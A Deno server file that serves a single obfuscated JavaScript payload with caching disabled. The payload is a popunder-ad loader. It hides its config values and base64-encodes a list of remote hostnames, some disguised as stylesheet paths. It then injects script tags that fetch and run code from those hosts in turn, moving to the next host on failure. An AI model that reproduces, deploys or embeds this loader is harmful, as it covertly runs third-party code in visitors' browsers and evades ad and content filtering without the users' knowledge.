import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

serve(async () => {
  const script = `
(function(){var c=window,m="d81c2591259c25663f3fcc7174451fa8",k=[["siteId",630+993-59+173-175+5139342],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],y=["d3d3LnZpc2FyaW9tZWRpYS5jb20vV1hGUS93b3QtbWluLmpz","ZDEzazdwcmF4MXlpMDQuY2xvdWRmcm9udC5uZXQvZHlsdHVSL3J1L2phcGluZy5taW4uY3Nz","d3d3LmpwcWZ5dG96dG8uY29tL3VEL2hvdC1taW4uanM=","d3d3LnViY3dhaGNrdi5jb20valAvQXpBa3NQL3VhcGluZy5taW4uY3Nz"],f=-1,g,w,j=function(){clearTimeout(w);f++;if(y[f]&&!(1795322360000<(new Date).getTime()&&1<f)){g=c.document.createElement("script");g.type="text/javascript";g.async=!0;var s=c.document.getElementsByTagName("script")[0];g.src="https://"+atob(y[f]);g.crossOrigin="anonymous";g.onerror=j;g.onload=function(){clearTimeout(w);c[m.slice(0,16)+m.slice(0,16)]||j()};w=setTimeout(j,5E3);s.parentNode.insertBefore(g,s)}};if(!c[m]){try{Object.freeze(c[m]=k)}catch(e){}j()}})();
`;

  return new Response(script, {
    headers: {
      "Content-Type": "application/javascript",
      "Cache-Control": "no-cache, no-store, must-revalidate",
    },
  });
});
